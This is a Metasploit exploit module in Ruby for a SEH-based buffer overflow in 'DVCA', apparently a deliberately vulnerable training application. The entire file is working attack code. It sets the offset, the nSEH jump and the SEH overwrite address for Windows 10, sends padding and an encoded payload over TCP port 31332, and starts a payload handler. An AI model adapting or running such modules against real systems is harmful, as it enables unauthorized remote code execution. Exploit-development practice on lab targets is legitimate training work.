##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'DVCA SEH-Based Buffer Overflow',
      'Description'    => %q{
          This module exploits a SEH-based BOF the DVCA.
        },
      'Author'   =>
        [
          'fokt',  # Original exploit author
          'fokt'   # MSF module author
        ],
      'License'        => MSF_LICENSE,
      'Payload'        =>
        {
          'Space'    => 968,
          'BadChars' => "\x00"
        },
      'Platform'       => 'win',
      'Targets'        =>
        [
          [ 'Windows 10', {'Seh' => 0x19196530, 'Offset' => 1104, 'Nseh' => 0x90900deb, 'Pad' => 20} ]
        ],
      'Privileged'     => false,
      'DefaultOptions' =>
        {
          'SRVHOST' => '0.0.0.0',
          'EXITFUNC' => 'thread'
        },
      'DisclosureDate' => 'Aug 31 2018',
      'DefaultTarget'  => 0))

    register_options [ OptPort.new('RPORT', [ true, 'The DVCA port to listen on', 31332 ]) ]
  end

  def exploit
	connect
	junk = make_nops(target['Offset'])
  pad = make_nops(target['Pad'])

	sploit = junk + [target['Nseh']].pack('V') + [target['Seh']].pack('V') + pad + payload.encoded
	sock.put(sploit)
	
	handler
	disconnect
  end

end
